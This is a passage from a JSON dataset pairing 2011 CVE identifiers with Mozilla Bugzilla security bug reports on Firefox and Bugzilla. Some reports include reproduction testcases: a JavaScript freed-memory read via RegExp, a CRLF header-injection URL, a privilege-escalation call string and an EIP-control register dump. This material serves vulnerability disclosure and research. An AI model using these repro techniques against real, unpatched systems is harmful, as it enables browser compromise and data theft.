maintained correctly when the download prompt gains focus. It should be flushed and no new keys should be registered until after all keys are released. Reproducible: Always Steps to Reproduce: 1. Open script.htm 2. Press and hold Enter. Actual Results: calc.exe starts. Expected Results: No file should be launched without an explicit consent from the user. The attached example has been verified to launch calc.exe in Firefox 4.0.1 on Windows 7 SP1 64-bit and Windows XP SP2 32-bit."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=663899",
        "title": ".jar should not be openable on Mac or Linux, download only (CVE-2011-3666)",
        "description": "+++ This bug was initially created as a clone of Bug #662309 +++ On windows it was simple to make .jar executable in nsLocalFileWin and force users to download a .jar rather than letting them \"open\" it and run a privileged local Java Application. On Mac most files with the executable bit set do trigger the \"save only\" path, but something is special-casing .jar (noticing that the system has a handler for it) and letting it be opened anyway. I could not find any equivalent \"blacklist\" on Mac that .jar could be added to, and we desperately need one: just because the OS knows how to run a java archive (or other types) doesn't mean it's wise to do so from a web page. Someone who knows mac will have to take this. The original bug on this was externally reported and the Windows variant is fixed in Fx5 and 3.6.18 -- this is important to fix soon."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=662309",
        "title": ".jar should be marked executable",
        "description": "+++ This bug was initially created as a clone of Bug #657462 +++ If Java is installed \"opening\" a .jar file will launch a Java Application, which is definitely not 'web safe'. Since a .jar application can launch executables (among other things) we should mark that as an executable type so that users are forced to download and manually open rather than allow then to open from the download prompt (or worse, set it to auto-open). We should check to see if Java registers any other extensions while we're at it."
      }
    ],
    "CVE-2011-2373": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=617247",
        "title": "Use after free (in nsXULProtypeScript?) when viewing xul document w/JS disabled",
        "description": "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.12) Gecko/20101027 Fedora/3.6.12-1.fc14 Firefox/3.6.12 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.12) Gecko/20101027 Fedora/3.6.12-1.fc14 Firefox/3.6.12 Under certain conditions, when accessing a xul document in Mozilla Firefox, it appears that some memory is freed which could potentially still be in use. This results in a use after free vulnerability. This issue is highly sensitive to installed add-ons, which makes reliable exploitation rather difficult, but it can be fairly reliably exploited utilizing the popular NoScript add-on. This could potentially also affect other products such as Thunderbird (crashing in XPCOM code), but I have not found a way to demonstrate this. I am able to reproduce this in Firefox rather easily by opening many xul documents when scripts are not allowed for the domain that they are hosted on, then closing the browser. It tends to result in either a hang at exit (which is only easy to notice if running Firefox from a terminal), or result in a segmentation fault. It appears not to have the problem with hanging when running Firefox with gdb (it will simply segfault). I have tested this in both Windows Vista and Linux (Fedora 14). Reproducible: Sometimes Steps to Reproduce: Source of test.xul (referred to in the steps to reproduce): <?xml version=\"1.0\" encoding=\"UTF-8\"?> <page xmlns=\"http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul\"> <script type=\"application/javascript\"><![CDATA[ var t = 1; ]]></script> </page> 1. Install Firefox 3.6.12 and the NoScript add-on. 2. Run firefox attached to a debugger (firefox -g) and open test.xul multiple times (approximately 5). It could be placed on a web server, but was not in this example. 3. Make sure that NoScript has scripts disabled for the current domain. This may not be necessary, but was done during my tests. 4. Close firefox. When running firefox without gdb, it seems to hang at exit more often than it results in a segmentation fault. 5. Note that (most of the time) there will be a segmentation fault in free, which seems to be caused by a double free. In rare cases, depending on other open pages and various other factors, a function pointer will be overwritten when other memory is allocated with the address of the freed memory. This will result in a jump to an arbitrary location in memory at exit (in my tests, usually 0x1). Actual Results: As mentioned, it will either hang, result in a segmentation fault in free, or jump to an arbitrary address (very rarely). Expected Results: Firefox should properly terminate. Stack traces and test.xul will be attached."
      }
    ],
    "CVE-2011-2377": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=638018",
        "title": "[1.9.2] crash [@ ycc_rgb_convert] on image with src set to a resource with multipart/x-mixed-replace content type",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14 Visiting a webpage that contains multiple images with the src-attribute that refers to a multipart/x-mixed-replace resource , Firefox 3.6.14 on windows crashes after some time with [Access_Violation_Write]. Tested on Windows 7 Reproducible: Always Steps to Reproduce: 1. Visit test page 2. wait a few moments Actual Results: Firefox crashes Expected Results: Firefox don't crash Like bug 610601 , This crash is very intermittent , sometimes firefox will crash after some seconds , and sometimes firefox don't crash at all."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=639303",
        "title": "FF4 crashes on multipart image/motion jpeg stream changing image size [@ @0x0 | mozilla::imagelib::Decoder::Finish() ]",
        "description": "User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 Build Identifier: Nightly Build 5.March 2011 downloaded from http://ftp.mozilla.org/pub/mozilla.org/firefox/nightly/latest-trunk/firefox-4.0b13pre.en-US.mac.dmg Web page containing UI elements (select box). Changing the select box element will remotely (on the server) start a CGI script and set the relevant parameter. Something crashes FF4. Reproducible: Always Steps to Reproduce: 1. Open URL http://appcam.mobotixcam.de:2080 and authorize. Authorization Credentials (type without the quotes!) user : \"user\" password: \"Firefox\" 2. From select box (the one in the middle) choose \"Image Size\" 3. From select box (the one on the right) choose \"Mega\" or \"VGA\", whatever is not selected Actual Results: FF4 crashes. Expected Results: Image size is set to the selected size."
      }
    ],
    "CVE-2011-2378": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=648065",
        "title": "appendChild DOM Tree Inconsistency Remote Code Execution Vulnerability (ZDI-CAN-1141)",
        "description": "ZDI-CAN-1141: Mozilla Firefox appendChild DOM Tree Inconsistency Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 9, (AV:N/AC:L/Au:N/C:P/I:P/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw results when .setUserData() handlers are used with an object and .appendChild() is called within a handler. Ultimately the import operation resulting from an .appendChild() is not guarded from mutation, and invalid DOM trees can result. Invalid DOM trees can be navigated resulting in dereferencing invalid pointers which can be leveraged to execute arbitrary code in the context of the browser. Version(s) tested: Mozilla Firefox 3.6.13 Platform(s) tested: Windows XP SP3 DOM method appendChild() seems flawed. Due to the way adoptNode() user data callback mechanism is implemented, user can \"silently\" re-adopt node from within the handler. Hook is later re-executed, which allows attacker to build inconsistent DOM tree: with a single node being set as a child of 2 parents at the same time. Child itself will be pointing back at one of its parents as THE parent. Somehow like on the diagram below: root /+ \\+ // \\\\ +/ +\\ parent1 parent2 \\ /+ \\ // + +/ child In other words, JavaScript notation, all assertions hold: root.childNodes.length == 2 root.childNodes[0] == parent1 root.childNodes[1] == parent2 root.parentNode == null parent1.childNodes.length == 1 parent1.childNodes[0] == child parent1.parentNode == root parent2.childNodes.length == 1 parent2.childNodes[0] == child parent2.parentNode == root child.childNodes.length == 0 child.parentNode == parent2 This invalid DOM tree can be exploited in numerous ways, the POC illustrates one example using node iteration. The example POC results in attacker control of EIP: (2e0.190): Access violation - code c0000005 (!!! second chance !!!) eax=0c0c0c0c ebx=04ad2460 ecx=04ad2460 edx=109d8c34 esi=01b6a954 edi=00000000 eip=0c0c0c0c esp=0012eba8 ebp=0012ebec iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206 <Unloaded_ta.dll>+0xc0c0c0b: 0c0c0c0c 0c0c or al,0Ch Regarding filtering, this vulnerability can be triggered via JavaScript with many potential representations in code and as a result may be difficult if not impossible to filter. -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2011-2379": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=637981",
        "title": "[SECURITY] \"Raw Unified\" patch diffs can cause XSS on this domain in IE 6-8 and Safari",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 Build Identifier: A valid patch file, uploaded as an attachment to a Bugzilla installation (and marked as a patch), can be served up raw from the Bugzilla installation's main domain with Content-type text/plain. In IE 6 through 8, that Content-type triggers HTML sniffing behavior: as such, a malicious patch containing HTML will be parsed when viewed in those browsers, allowing for the execution of JavaScript in the context of the Bugzilla installation. Reproducible: Always Steps to Reproduce: 1. Create a patch file containing HTML 2. Upload it as an attachment to an existing bug, making sure to mark it as a patch 3. Under Attachments, find your malicious patch and click on \"Diff\" (it's right next to \"Details\") 4. Up toward the top of the page, click on \"Raw Unified\". Notice the address bar does not switch domains, as it normally does when serving up user content. 5. If you're in IE, you should see the attachment being parsed as HTML."
      }
    ],
    "CVE-2011-2380": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=653477",
        "title": "[SECURITY] Group names can be guessed when creating or editing a bug",
        "description": "Symptoms are a bit different in 3.4/3.6 and in 4.0/4.2, but it's one same problem: 3.4/3.6: ======= When entering a new bug, you can pass bit-X=1 to list of parameters, where X is a group ID, and if the group exists but is not used for bugs, then you get: \"Attempted to add bug to the 'foo' group, which is not used for bugs.\" If the group ID exists but is either a system group or a user group used for bugs, then you get no error. So only the name of user groups which aren't used for bugs can be disclosed. For existing bugs, there is no name disclosed, because the error message displays the group ID instead. 4.0/4.2: ======= When editing an existing bug, you can pass groups=foo to the list of parameters, where foo is the group name, and if the group doesn't exist, process_bug.cgi tells you so: \"There is no group named 'foo'.\" https://bugzilla.mozilla.org/process_bug.cgi?id=653341&groups=I_love_LpSolit If the group exists, you get: \"You tried to restrict bug X to to the 'foo' group, but bugs in the 'TestProduct' product can not be restricted to that group.\" (nit: note also the typo \"to to\") https://bugzilla.mozilla.org/process_bug.cgi?id=653341&groups=bugzilla-approvers When creating a new bug, illegal groups are silently ignored (bug 653341)."
      }
    ],
    "CVE-2011-2381": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=657158",
        "title": "[SECURITY] Request email headers for attachment containing newline are corrupt",
        "description": "I received a request for an attachment with the following description: >Read the ignored data >[Checked in: See comment 18] This caused the notification email to be corrupted. I don't remember seeing this corruption before so I think it's a regression."
      }
    ],
    "CVE-2011-2605": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=643051",
        "title": "document.cookie should only allow setting one cookie at a time",
        "description": "Currently, document.cookie allows setting multiple cookies in a single call. This is inconsistent with other browsers as well as our documentation: https://developer.mozilla.org/en/document.cookie \"Note that you can only set/update a single cookie at a time using this method.\" This can lead to security problems in web applications: When an external script takes untrusted input (e.g. from a URL parameter), that input can contain line breaks, and thus set multiple cookies to the including web site. Therefore, we should disallow setting multiple cookies using document.cookie."
      }
    ],
    "CVE-2011-2976": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=660053",
        "title": "[SECURITY] If a BUGLIST cookie is compromised, it can be used to XSS show_bug.cgi and inject HTML into <head>",
        "description": "Bugzilla 3.4.11 and below are affected by an XSS that is only possible if the user's BUGLIST cookie is somehow compromised. The bug_list.first and bug_list.last variables in the bug/navigate.html.tmpl template are not properly escaped when displayed. As far as we know, it is not possible to compromise the BUGLIST cookie in Bugzilla, and as such we are not treating this as a high-priority security issue, but still something that we should fix for the 3.4 branch in case administrators have customized their installation in such a way that BUGLIST could have been compromised, or there are other programs on the user's system that could somehow have compromised the cookie."
      }
    ],
    "CVE-2011-2978": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=670868",
        "title": "[SECURITY] Account preferences page trusts user-modifiable field for obtaining current e-mail address",
        "description": "I noticed this while investigating bug 670669. The 'account' tab under user prefs contains a hidden 'old_email' field. This field can be easily modified by a malicious user to contain some other address besides what is actually used. This prevents the real user from receiving an e-mail address confirmation message, so he/she may not notice that somebody has stolen his/her account. In userprefs.cgi : SaveAccount(), 88 my $old_login_name = $cgi->param('old_login'); ^^ pulled from user content 136 Bugzilla::Token::IssueEmailChangeToken($user, $old_login_name, 137 $new_login_name); ^^ trusted as actual previous e-mail address Instead of trusting user content, should just pull the e-mail address from the user object."
      }
    ],
    "CVE-2011-2983": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=626297",
        "title": "regexp-statics possibly allows to read private data",
        "description": "Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.2.13) Gecko/20101203 Description: When RegExp.input is set, JSSubString which RegExp.$1 uses becomes a dangling pointer. So, scripts can read a freed-and-recycled memory area. Testcase: 1. Open the new tab and execute: javascript: function S(v) { return \"xxxxxxx,xxxxxxx,xxxx\" + v; } /^(.*)/.exec(S(0)); RegExp.input = S(1); clearInterval(window.tid); window.tid = setInterval(function () { document.title = \"[\" + RegExp.$1 + \"]\"; }, 1000); void 0; 2. Then browse some sites in other tabs."
      }
    ],
    "CVE-2011-2984": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=572129",
        "title": "Arbitrary code execution via browser's tab element that was dropped on the content area",
        "description": "If a user drag a browser's tab element and drop it on the content area, a content-registered drop event listener can access the tab element and its properties including privileged functions. Only drop event listeners can access privileged objects without the security check. http://hg.mozilla.org/mozilla-central/file/2348611d0230/content/events/src/nsDOMDataTransfer.cpp#l455"
      }
    ],
    "CVE-2011-2986": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=655836",
        "title": "Information leakage between canvases and origins [Windows D2D]",
        "description": "User-Agent: Mozilla/5.0 (Windows NT 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier: Mozilla/5.0 (Windows NT 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Information leakage between canvases and origins. Reproducible: Always Steps to Reproduce: 1. have a canvasA which is inserted into DOM tree and visible 2. draw green rect onto canvasA 3. have canvasB, which is not inserted into DOM tree 4. draw canvasA onto canvasB 5. draw red rect and different-origin image onto canvasA A repro implementation is attached. Actual Results: Red rect and different-origin image on canvasB (which has origin-clean flag true) if accessed 'later than immediately' Expected Results: Green rect and no different-origin image on canvasB (which has origin-clean flag true) - GPU: GeForce 9650M GT, Driver Version 270.61 - also reproducable in FF4.0 - bug does not occurs when canvasA meets any of the following conditions: . is not in DOM tree . has css display: none . has css visible: hidden . has css opacity less than 1 and the canvasA is not (fully?) overlayed by another element"
      }
    ],
    "CVE-2011-2987": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=665934",
        "title": "GrowAtomTable() return code not checked, crash due to ANGLE",
        "description": "Michael Jordon of Context IS sent this bug to us, based on testing on a WinXP SP3 machine and Firefox 4.0.1 (I believe, based on the other bug). He writes:"
      }
    ],
    "CVE-2011-2988": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=665936",
        "title": "string crash found while fuzzing WebGL shaders",
        "description": "Michael Jordon of Context IS submitted this Javascript string crash he found while testing WebGL in Firefox 4.0.1 on WinXP. He cannot reproduce the bug in a nightly build, but doesn't know if that means we've fixed it or the crash is just moved a bit. From Michael: This, might be related to WebGL but I don't think it actually is. It was just exposed when doing fuzzing against the shader compiler. It isn't clear if this has a security implication, although it looks possibly like some memory is getting overwritten causing the issues to occur. The bug seems to manifest in two different ways, both of them when calling into nsPromiseFlatString::nsPromiseFlatString. The first manifestation ends up with a call to memcpy where the source pointer is too small for the number of bytes it is supposed to be copying so crashes on a read AV. This is string crash 1. The second is a stack overflow, where the code calls into the function xul!nsAString_internal::Assign which seems to think it can optimise the string operation by calling back into itself, which causes an infinite loop and eventually the stack runs out. This is string crash 2. Which one occurs seems to depend on what has already been loaded at the time. The PoC minimal_crash.html exhibits the bug on 4.0.1 on XP SP3. It doesn't seem to crash the latest nightly build, however slight changes to the Javascript (which doesn't change function, just form) seems to also stop the crash so it might just be the nightly build is rebuilt in such a way that memory layout is sufficiently different to stop the underlying bug, or it could be fixed."
      }
    ],
    "CVE-2011-2989": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=674042",
        "title": "WebGL: crash in getUniformLocation with too long uniform identifiers",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0.1) Gecko/20100101 Firefox/5.0.1 Build ID: 20110707182747 Steps to reproduce: I played arround with webgl and suddenly my browser crashed. If the string parameter is too long in the function getUniformLocation the browser is going to crash. I created a poc... Actual results: The browser crashed"
      }
    ],
    "CVE-2011-2991": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=655660",
        "title": "Firefox 4 crashing when I try to delete emails using Yahoo! Mail Beta [@ js::mjit::JaegerShot ]",
        "description": "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Whenever I try to delete emails from new Yahoo! Mail Beta the Firefox 4 is crashing. Here are the crash reports http://crash-stats.mozilla.com/report/index/bp-fcaf835d-74d6-4bf8-b743-ebc2b2110506 http://crash-stats.mozilla.com/report/index/bp-6febb105-15de-4187-aeca-dff462110506 http://crash-stats.mozilla.com/report/index/bp-7f1af8c4-fe1e-480e-a21a-6ef232110505 http://crash-stats.mozilla.com/report/index/bp-7dd5937e-58d3-4ac5-a0b7-e45532110505 http://crash-stats.mozilla.com/report/index/bp-9c1687b3-58dd-4109-8d90-e1c7e2110504 http://crash-stats.mozilla.com/report/index/bp-778685f4-0b0d-4c16-a6f5-667e72110505 Reproducible: Always Steps to Reproduce: 1. Goto Yahoo! Mail Beta 2. Goto Inbox and try to delete emails by pressing delete key 3. Keep deleting and Firefox crashes"
      }
    ],
    "CVE-2011-2992": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=672789",
        "title": "this script reliably crashes Firefox 5 on Linux, Mac and Windows by streaming an ogg file through a proxy",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.124 Safari/534.30 Steps to reproduce: Connect to a proxyserver & stream a specific ogg file to an HTML5 player. Then I seek to a part that has not yet been loaded. Actual results: On firefox 4 this works, on 5 and 6 I get a crossplatform crash (Windows, Linux, Mac), a segfault Expected results: No segfault."
      }
    ],
    "CVE-2011-2993": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=657267",
        "title": "possible for unsignend script to call functions inside signed scripts (jar)",
        "description": "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 It is possible for unsigned scripts to call functions inside signed scripts on the same host and thus possibly execute code using expanded privileges. Possibly a regression from Firefox 3.6. Reproducible: Always Steps to Reproduce: 1. go to http://ebenda.org/2011/signed.call/ 2. click link Actual Results: Function a() inside signed jar is executed from unsinged page. Expected Results: Exception is raised. Like Firefox 3.6.17 does: \"Fehler: <http://ebenda.org> wurde die Erlaubnis für das Lesen der Eigenschaft Window.a verweigert. Quelldatei: javascript:alert(window.frames[0].a('netscape.security.PrivilegeManager.enablePrivilege(\\'UniversalXPConnect\\');Components.classes[\\'@mozilla.org/xre/app-info;1\\'].getService(Components.interfaces.nsIXULRuntime).OS')); Zeile: 1\" If privileges were granted to signer of the signed jar permanently before executing the attack, no confirmation dialog will occur."
      }
    ],
    "CVE-2011-2998": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=684815",
        "title": "Crash in the SpiderMonkey v.1.9.2 (FF 3.6.21) during regular expression evaluation",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.854.0 Safari/535.2 Steps to reproduce: Originally I browsed to attached regx.htm file using FireFox 3.6.21 on Windows 7 x64 Actual results: Browser crashed with a crash stack like mozcrt19.dll!memcpy(unsigned char * dst, unsigned char * src, unsigned long count) Line 188 Asm js3250.dll!PushBackTrackState(REGlobalData * gData, REOp op, unsigned char * target, REMatchState * x, const unsigned short * cp, unsigned int parenIndex, unsigned int parenCount) Line 3477 + 0x17 bytes C++ js3250.dll!js_ExecuteRegExp(JSContext * cx, JSRegExp * re, JSString * str, unsigned int * indexp, int test, int * rval) Line 4897 + 0x8e bytes C++ js3250.dll!regexp_exec_sub(JSContext * cx, JSObject * obj, unsigned int argc, int * argv, int test, int * rval) Line 5716 + 0x3e bytes C++ js3250.dll!regexp_test(JSContext * cx, unsigned int argc, int * vp) Line 5741 + 0x71 bytes C++ js3250.dll!js_Interpret(JSContext * cx) Line 2208 + 0x1d bytes C++ mozcrt19.dll!arena_malloc_small(arena_s * arena, unsigned int size, int zero) Line 3737 C mozcrt19.dll!malloc(unsigned int size) Line 5790 + 0x2f bytes C js3250.dll!js_NewObjectWithGivenProto(JSContext * cx, JSClass * clasp, JSObject * proto, JSObject * parent, unsigned int objectSize) Line 2090 + 0x2d bytes C++ xul.dll!WrappedNative2WrapperMap::Add(WrappedNative2WrapperMap * head, JSObject * wrappedObject, JSObject * wrapper) Line 726 + 0x8 bytes C++ xul.dll!nsXPConnect::GetWrapperForObject(JSContext * aJSContext, JSObject * aObject, JSObject * aScope, nsIPrincipal * aPrincipal, unsigned int aFilenameFlags, int * _retval) Line 2478 + 0x96 bytes C++ xul.dll!XPC_WN_JSOp_ThisObject(JSContext * cx, JSObject * obj) Line 1471 C++ The same crash happened on Ubuntu Linux and on Debian Linux 5.0. The I took sources from http://hg.mozilla.org/releases/mozilla-1.9.2/, built SpiderMonkey 1.9.2 and its shell demonstrate the same crash when run on extracted from HTML file JavaScript: #0 0x00529caf in memcpy () from /lib/libc.so.6 #1 0x08119f01 in PushBackTrackState (gData=0xbf88a32c, op=REOP_EOL, target=0xb6d6451b \".\\035\\0030\", x=0x9d28d50, cp=0x9d24310, parenIndex=0, parenCount=0) at ../jsregexp.cpp:3477 #2 0x0811a4a1 in ExecuteREBytecode (gData=0xbf88a32c, x=0x9d28d50) at ../jsregexp.cpp:4261 #3 0x0811fcdc in MatchRegExp (gData=0xbf88a32c, x=0x9d28d50) at ../jsregexp.cpp:4754 #4 0x0811fef7 in js_ExecuteRegExp (cx=0x9cfce18, re=0xb6d4d008, str=0x9d1a690, indexp=0xbf88a440, test=1, rval=0x9d244a8) at ../jsregexp.cpp:4883 #5 0x0812098e in regexp_exec_sub (cx=0x9cfce18, obj=0x9d1d0e0, argc=1, argv=0x9d244b0, test=1, rval=0x9d244a8) at ../jsregexp.cpp:5696 #6 0x08120a6e in regexp_test (cx=0x9cfce18, argc=1, vp=0x9d244a8) at ../jsregexp.cpp:5721 #7 0x081e39eb in js_Interpret (cx=0x9cfce18) at ../jsops.cpp:2208 #8 0x080c2cf6 in js_Execute (cx=0x9cfce18, chain=0x9d1d000, script=0x9d243b0, down=0x0, flags=0, result=0x0) at ../jsinterp.cpp:1601 #9 0x0805b1b3 in JS_ExecuteScript (cx=0x9cfce18, obj=0x9d1d000, script=0x9d243b0, rval=0x0) at ../jsapi.cpp:4964 #10 0x080530dc in Process (cx=0x9cfce18, obj=0x9d1d000, filename=0xbf88c7a1 \"regexe.js\", forceTTY=0) at ../../shell/js.cpp:442 #11 0x08053c7f in ProcessArgs (cx=0x9cfce18, obj=0x9d1d000, argv=0xbf88add8, argc=1) at ../../shell/js.cpp:849 #12 0x0805405f in main (argc=1, argv=0xbf88add8, envp=0xbf88ade0) at ../../shell/js.cpp:4853 (gdb) f 1 #1 0x08119f01 in PushBackTrackState (gData=0xbf88a32c, op=REOP_EOL, target=0xb6d6451b \".\\035\\0030\", x=0x9d28d50, cp=0x9d24310, parenIndex=0, parenCount=0) at ../jsregexp.cpp:3477 3477 sizeof(REProgState) * result->saveStateStackTop); gdb) p/x result->saveStateStackTop $4 = 0xfffffcea (gdb) p sizeof(REProgState) $5 = 24 For the best of my understanding this crash is exploitable, because memcpy function overrides both stack and heap - it tries to copy ~24*4GB of memory due to the integer underflow of result->saveStateStackTop and data to be copied is under control of web page author - both regular expression and string to search in. Before this crash happens valgrind reports about number of related invalid write(s) and read(s). Expected results: No crash"
      }
    ],
    "CVE-2011-2999": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=665548",
        "title": "Named frames can shadow window.location sometimes",
        "description": "location is a non-configurable property, so if you look up window.location before there is a <frame name=\"location\"> you will always get the right window.location after that. But if you look it up for the first time _after_ such a frame exists, you will get the Window for the frame. Effectively, the fix for bug 541530 can be circumvented by this means."
      }
    ],
    "CVE-2011-3000": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=655389",
        "title": "CRLF Injection and the parsing of HTTP headers",
        "description": "My name is Ian Graham and I’m a Senior Security Engineer working with Citrix Online. Recently, we’ve been doing some research on CRLF injection (HTTP Response Splitting) attacks, and we found a behavior in Firefox that facilitates a specific type of attack. Consider a web application which is vulnerable to CRLF Injection via an external redirect. In other words, the application is configured to redirect requests for http://www.vulnerable.com/webmail/* to http://webmail.vulnerable.com/*, or something similar. Provided that the application is not correctly filtering CRLF characters, an attacker could create a malicious URI that, upon visiting, would redirect the victim to a website of his choice (in this case, the venerable badgerbadgerbadger.com). For example, the request: http://www.vulnerable.com/webmail/path%0d%0aLocation:%20http://www.badgerbadgerbadger.com Will yield a response that looks something like: HTTP/1.1 302 Found Location: http://webmail.vulnerable.com/path Location: http://www.badgerbadgerbadger.com Content-Type: text/html Content-Length: 156 Date: Thu, 05 May 2011 20:13:07 GMT The URL has moved <a href=\"http://webmail.vulnerable.com/path Location: http://www.badgerbadgerbadger.com\">here</a> And the client will automatically be redirected to http://www.badgerbadgerbadger.com. This is a pretty standard CRLF injection attack, but the interesting thing here is that it only works on Firefox (Tested on 4.0.1). I’ve tested with various versions of Chrome and IE, and they do not redirect the user to the malicious link. I’m not super familiar with the internals of Firefox, but I’m guessing that this is because Firefox parses headers in a slightly different way than IE or Chrome (i.e. in the case where there are multiple headers with the same name, IE/Chrome use the first header in the response, while Firefox apparently uses the last). I don’t know if this particular behavior was intended, or if it’s just a side effect of Firefox’s implementation, and I’m not claiming that this is a Security Vulnerability per se. I just wanted to bring this behavior to the attention of the team, and point out that it facilitates a specific class of attacks."
      }
    ],
    "CVE-2011-3001": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=672485",
        "title": "Holding enter allows arbitrary extension installation.",
        "description": "It is possible to install an arbitrary XPI without user's consent if the user holds Enter on a malicious website containing a specially crafted JavaScript code. There are 2 layers of protection against an unauthorized installation of extensions: 1) The principal of the opener is checked against whitelisted domains that are allowed to download the plugin without asking. If the domain is not trusted, the user is asked to allow to download the plugin. 2) When the plugin is downloaded, the user is asked to confirm the installation. The first protection can be circumvented by creating a hidden \"Embed\" element containing an arbitrary XPI as its \"pluginspage\" parameter. The attacker can focus this element while the user holds Enter, causing a number of \"Plugin Finder Service\" windows to appear. The first window focuses the \"Cancel\" button and will just close, but all the subsequent ones will set focus on the \"Manual Install\" button directing to the malicious XPI. As soon as the user releases the key, the browser will start launching multiple windows with the provided URL. The windows will have a ChromeWindow object as their opener, so the user will not be asked to allow to download a plugin. The second protection can be bypassed due to a logic error in amWebInstallListener.js. When no window-watcher is registered in Services, this will throw: Services.ww.openWindow(this.window, \"chrome://mozapps/content/xpinstall/xpinstallConfirm.xul\",null, \"chrome,modal,centerscreen\", args); with the following message in the console: Warning: WARN addons.manager: InstallListener threw exception when calling onDownloadEnded: TypeError: Services.ww is undefined Source File: resource://gre/components/amWebInstallListener.js Line: 170 When the confirmation dialog fails to open, the installation will commence as though the user clicked \"Install\". Getting the browser into a state in which Services.ww is permanently undefined can be achieved with no user interaction by using a modified version of https://bugzilla.mozilla.org/show_bug.cgi?id=616659 on a signed website. Exploiting it locally will likely bring about corrupt windows and a lot of errors in the console, but Services.ww will be defined. On a remote signed website, with the try-catch-inside-eval recursion performed during page load, after an alert dialog which prevents \"too much recursion\" error from occuring, it fails silently and Services.ww remains undefined for the whole browsing session, ie. Firefox will not ask to confirm a plugin installation until the user restarts the browser. The only mitigating factor is that if Services.ww was defined earlier in the browser session, the exploit may fail and corrupt windows will appear (hence point #2 in the steps described below, after opening windows to import the certificate). This was noticed by Zach Hoffman in https://bugzilla.mozilla.org/show_bug.cgi?id=616659#c37 but the implications there were reverse. There may be other ways to wind up with Services.ww undefined, but those should be safe as long as the plugin installation is stopped when xpinstallConfirm.xul fails to open. Reproducible: always (as long as Services.ww wasn't defined earlier in the browsing session) Steps to reproduce: 1. Import x509.cert for software makers identification. 2. Close the browser and reopen after the process shuts down. 3. Open jar:http://x.x.x.x/mozilla/signed.jar!exploit.htm (see comment 1) 4. Press and hold enter. Actual results: The plugin is automatically downloaded and installed. Expected results: The plugin should neither be downloaded nor installed without user's consent. Verified to work with Firefox 5.0.1 on Windows 7 SP1 64-bit and Windows XP SP3 32-bit."
      }
    ],
    "CVE-2011-3002": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=680840",
        "title": "GrowAtomTable() return code not checked",
